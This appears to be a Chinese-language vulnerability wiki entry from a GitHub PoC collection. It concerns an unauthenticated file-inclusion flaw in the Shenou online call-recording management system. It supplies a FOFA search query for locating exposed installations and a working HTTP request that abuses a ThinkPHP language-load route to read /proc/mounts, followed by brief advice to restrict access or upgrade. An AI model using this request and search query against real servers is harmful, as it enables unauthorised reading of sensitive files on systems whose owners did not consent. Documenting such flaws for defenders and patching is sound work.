---
fofa: "title="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

#   申瓯通信设备在线录音管理系统-index-文件包含 

# 漏洞描述

申瓯通信设备在线录音管理系统-index-文件包含漏洞，未经身份验证的攻击者可以通过该漏洞获取服务器敏感信息。

# 影响版本

在线录音管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="在线录音管理系统"

```
GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```

![image-20250326114838446](./.resource/申瓯通信设备在线录音管理系统-index-文件包含/media/image-20250326114838446.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
